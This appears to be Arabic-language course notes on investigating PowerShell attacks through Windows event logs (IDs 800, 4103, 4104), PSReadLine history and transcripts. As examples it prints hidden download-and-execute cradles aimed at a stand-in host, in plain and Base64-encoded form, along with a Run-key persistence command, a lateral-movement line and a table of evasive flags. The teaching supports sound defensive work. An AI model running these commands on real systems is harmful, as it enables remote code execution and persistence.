# CH 6 Investigating PowerShell   Event Logs

## Introducing PowerShell



أداة PowerShell هي عبارة عن Command-line shell وكمان Scripting tool طورتها شركة Microsoft سنة 2005. الأداة دي بتنزل بشكل افتراضي (By default) على كل نسخ Windows الجديدة عشان تساعد في عمليات الـ Automation والـ Configuration management.

بيعتمد الـ PowerShell في شغله على حاجة اسمها Cmdlets (بتتنطق Command-lets)، وهي عبارة عن مجموعة commands  متخصصة بتخلي المستخدم ينفذ مهام محددة، زي الـ Remote access أو عرض الـ Processes.

تتبع الـ Cmdlets نمط تسمية ثابت وهو Verb-noun، وبتتكون غالباً من تلات أجزاء:

1. (Verb).
2. (Noun).
3. (Option/Parameter).

format :  `Verb-Noun [-Parameter]`

#### Examples of Cmdlets

Get-Process -name svchost

### Why do attackers prefer PowerShell?

الاعتماد الكبير على الـ PowerShell في الهجمات مكنش صدفة، وده بيرجع لكذا سبب رئيسي:

* لأن الأداة دي بتنزل by default on  windows  وكمان Whitelisted على كل أنظمة تشغيل Windows.
* بسبب إنها بتسيب وراها عدد قليل من الـ Digital artifacts بعد تنفيذ الهجوم.
* عشان بتوفر إمكانيات الـ Remote access من خلال  (Encrypted channel).
* وجود  (Growing community) بيوفر سكريبتات جاهزة للـ Penetration ومتاحة للاستخدام المباشر.

### PowerShell usage in different attack phases

#### Threat Actor Groups and PowerShell Tools

الجدول ده بيوضح إزاي مجموعات الـ Threat Actors بتستخدم أدوات الـ PowerShell عشان تحقق أهدافها:

| **Threat Actor** | **Target Industries**      | **Target Geographies**     | **Use Case (Tactics)**     | **Tools**            |
| ---------------- | -------------------------- | -------------------------- | -------------------------- | -------------------- |
| APT 19           | Defense, Energy, High Tech | Australia, North America   | Defense Evasion            | Empire               |
| APT32            | Government, Media          | East Asia                  | Execution, C2              | Nishang, PowerSploit |
| APT33            | Energy, Aerospace          | Middle East, North America | Persistence, C2            | PoshC2, Empire       |
| APT41            | Healthcare, Technology     | Europe, Middle East        | Persistence                | PowerSploit          |
| MuddyWater       | Telecommunications, Gov    | Middle East, Europe        | Defense Evasion, Execution | Empire, PowerSploit  |
| Turla            | Government, Military       | US, Europe, Middle East    | Execution, C2              | Empire, PoshSecMod   |

***

#### Common Malicious PowerShell Commands

دي أشهر الcommandsاللي بيستخدمها الattackers عشان يحققوا أهداف محددة،&#x20;

**1. Execution**&#x20;

الcommand ده بيستخدم عشان يحمل ملف خبيث من الإنترنت ويشغله فوراً في الـ Memory:

PowerShell

```
powershell -w hidden -ep bypass -nop -c "IEX ((New-Object System.Net.Webclient).DownloadString('http://soctest.xyz/malware.ps1'))"
```

* الـ -w hidden: بيخفي شاشة الـ PowerShell عن المستخدم.
* الـ -ep bypass: بيتخطى سياسة التنفيذ (Execution Policy) عشان يشغل السكريبت.
* الـ -nop: بيمنع تحميل الـ PowerShell Profile الخاص بالمستخدم.
* الـ IEX (Invoke-Expression): أداة خطيرة بتنفذ أي "نص" كأنه أمر برمجيمباشر.

**2. Persistence**&#x20;

عشان يضمن إن الـ Malware يشتغل كل ما الجهاز يفتح، بيضيف مكان في الـ Registry:

PowerShell

```
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name "socmalware" -Value "C:\Windows\temp\volnaf.exe"
```

* الـ New-ItemProperty: بيعمل Registry entry جديد.
* الـ Path: بيحدد مكان التشغيل التلقائي في الـ Windows.

**3. Lateral Movement**&#x20;

عشان يتنقل من جهاز لجهاز تاني جوه نفس الشبكة:

PowerShell

```
Enter-PSSession -ComputerName 10.10.0.2 -Credential $credentials
```

* الـ Enter-PSSession: بيفتح جلسة تفاعلية (Interactive session) مع جهاز بعيد.
* الـ -Credential: بيمرر بيانات الدخول المسروقة للجهاز التاني.

## PowerShell execution tracking events

في الجزء ده هنركز على تلاتة Event logs مهمين جداً في عملية الـ Investigating:

* ال Event ID 800: وده بيكون موجود في ملف الـ Windows PowerShell Event Log.
* &#x20;  ال Event IDs 4103 و 4104: ودول موجودين في ملف الـ Microsoft-Windows-PowerShell/Operational.

***

#### Event ID 4104 (Script Block Logging)

بداية من الـ PowerShell version 5، شركة Microsoft قدمت ميزة الـ Script block logging عشان تسجل أي Script block بيتعمله Execution بالكامل. ميزة الـ Script block logging بتكون Disabled بشكل افتراضي، بس بتقدر تعمل Log لأي Suspicious activities بشكل أوتوماتيك حتى لو هي Disabled. السجل Event ID 4104 بيحفظ الـ Contents بتاعة الـ Script من أول Execution.

***

#### Reconstructing and Analyzing Scripts

السجل Event ID 4104 بيخليك قادر تعمل Reconstruct للـ Script بالكامل عن طريق تجميع الـ Events اللي ليها نفس الـ ScriptBlock ID. تقدر تنفذ الخطوة دي بطريقتين:

* الطريقة الـ Manual: إنك ترتب وتنسخ الأجزاء في أي Text editor زي الـ Notepad عشان تبني الـ Script كله.
* الطريقة الـ Automated: باستخدام سكريبتات جاهزة&#x20;

بعد عملية الـ Reconstruct، تقدر تعمل Static analysis و Dynamic analysis عن طريق إنك ترفع الـ Scripts دي على Sandbox، أو تفحصها على VirusTotal، أو تعملها Scanning باستخدام الـ YARA rules.

الـ Event ID 4104 بيقدم Great value في تتبع الـ Attackers واكتشاف الـ File-less attack techniques اللي بتعتمد على الـ PowerShell عشان تحط الـ Malicious code في الـ Memory بشكل مباشر.

#### Event ID 4103

ال Event ID 4103 مش بيقدم  تفاصيل دقيقة زي الـ Event ID 4104، بس هو لسه Useful ومهم جداً. الفايدة الأساسية بتاعته إنه بيعمل Log للـ Executed modules والـ Cmdlets.

#### Event ID 800

ال Event ID 800 في ملف الـ Log اللي اسمه Windows PowerShell. الlog  ده بيعمل Record لأي PowerShell command executions بتتم من خلال الـ Console. الميزة دي بتكون Enabled by default وشغالة على كل الـ Versions بتاعة PowerShell.

الlog  ده بيوضح نفس الـ Execution activities اللي بيسجلها Event ID 4104، وبيعرض الـ Executed command line، واسم الـ Username اللي نفذ command، وكمان الـ Version بتاع PowerShell.

***

#### Additional Logging Features

بجانب الـ Event logs، Microsoft بتقدم ميزتين كمان عشان تعمل Monitoring للـ PowerShell execution activities.

**PSReadLine**

أداة PSReadLine بتسمحلك تعمل Track للـ History بتاع كل أمر بيتكتب في الـ PowerShell console. الفكرة دي شبه الـ History command في أنظمة Linux، بس هنا الـ History بيتخزن في فايل مخصص على الـ Disk.

في العادي، الـ History ده بيتحفظ في ملف TXT جوه مجلد الـ AppData بتاع المستخدم في المسار ده:

Plaintext

```
C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

الميزة دي بتضمن إنك تلاقي Reliable record للأوامر اللي اتنفذت عشان تساعدك في الـ Analysis والـ Auditing.

**Transcripts**

ميزة Transcripts بتخليك تعمل Track للـ Input والـ Output بتوع الـ PowerShell sessions. الميزة دي بتسجل الأوامر اللي اتنفذت، والـ Output بتاعها، وأي Error messages تظهر خلال الـ Session. في حالة أي Cyber-attack، الميزة دي هتكون Helpful جداً لأنها بتسجل الـ Operation بتاعة الـ Attacker بالكامل.

لو قارنا بين الميزتين، هنلاقي إن PSReadLine بيسجل بس الأوامر اللي اتكتبت، بينما Transcripts بتسجل Robust information زي الـ Start time، والـ Username، والـ Machine name، والـ Version، وكل الـ Input والـ Output وحتى الـ Error messages.

## Investigating PowerShell attacks

### Fileless PowerShell malware

الـ Fileless malware، أو اللي بنسميه أحياناً Memory-based malware، هو نوع من الكود الخبيث اللي بيشتغل مباشرة جوه الـ Memory. الميزة (بالنسبة للمخترق) هنا إنه مش بيسيب أي أثر لملفات Executable تقليدية على الـ Disk، وده بيصعّب جداً مهمة برامج الـ Antivirus العادية.

***

#### PowerShell Cradle

المخترق بيستخدم تكنيك اسمه PowerShell cradle عشان يحمل Malicious script من سيرفر بعيد ويشغله فوراً في الـ Memory. الهدف من الحركة دي هو الـ Evasion، يعني الهروب من أنظمة الدفاع اللي بتراقب الملفات اللي بتنزل على الهارد ديسك.

ده أشهر مثال للـ Cradle اللي بيستخدم وظيفة الـ DownloadString:

PowerShell

```
powershell.exe -ep bypass -nop -noexit -c iex ((New-Object System.Net.WebClient).DownloadString('http://soctest.xyz/malware.ps1'))
```

#### How to Investigate?

لو حصل هجوم بالشكل ده، تقدر تجمّع الأدلة كالتالي:

* Event ID 800: هنا هتلاقي الدليل على تشغيل أمر الـ PowerShell cradle نفسه (السطر اللي فوق ده بالظبط).
* Event ID 4104: ده "الكنز" الحقيقي، لأنك من خلاله هتقدر تلاقي وتعمل Reconstruct للمحتوى الكامل بتاع الـ Malicious script اللي اتحمل واتنفذ جوه الـ Memory، حتى لو مفيش ملف نزل على الجهاز.

### Suspicious PowerShell commands and cmdlets

| **Command / Argument**      | **Description (الوصف)**                                                                                                |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| -NonInteractive (-noni)     | بيستخدم عشان الـ PowerShell ميتفاعلش مع المستخدم (ميعرضش Prompt)، وده بيخلي العملية تتم في "صمت".                      |
| DownloadString              | وظيفة (Function) بتستخدم لتحميل كود من URL وحفظه كـ String في الـ Memory مباشرة.                                       |
| DownloadFile                | وظيفة بتستخدم لتحميل ملف من الإنترنت وحفظه فعلياً على الـ Disk.                                                        |
| -ExecutionPolicy (-ep)      | بيستخدم للتحكم في شروط تشغيل السكريبتات. الـ Attackers بيستخدموا Bypass أو Unrestricted عشان يشغلوا أي كود بدون تحذير. |
| -EncodedCommand (-e / -enc) | تكنيك بيستخدم لتشفير الأمر (غالباً بـ Base64) عشان يهرب من أنظمة الـ Detection اللي بتدور على كلمات معينة.             |
| Invoke-Command              | أمر بيستخدمه المخترق لتنفيذ أوامر على أجهزة تانية بعيدة (Remote systems).                                              |
| Enter-PSSession             | بيستخدم لفتح جلسة تفاعلية (Interactive session) والتحكم في جهاز تاني عن بُعد.                                          |
| Invoke-WebRequest           | أمر بيستخدم لتحميل الـ Malware أو الأدوات الإضافية من سيرفرات المخترقين.                                               |

#### Example of Encoded Command

شوف المثال ده لإزاي الـ Attacker بيكتب أمر مشفر عشان ميتكشفش:

PowerShell

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -exec bypass -win hidden -noni -e cG93ZXJzaGVsbC5leGUgLWVwIGJ5cGFzcyAtbm9wIC1ub2V4aXQgLWMgaWV4ICgoTmV3IE9iamVjdE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKOKAmGh0dHA6Ly9zb2N0ZXN0Lnh5ei9tYWx3YXJlLnBzMeKAmSkp
```

لو فكينا التشفير (Decoding) للجزء اللي بعد الـ `-e` (اللي هو الـ Base64)، هنكتشف إنه عبارة عن الـ PowerShell cradle اللي شرحناه قبل كده واللي بيحمل سكريبت من `http://soctest.xyz/malware.ps1`.



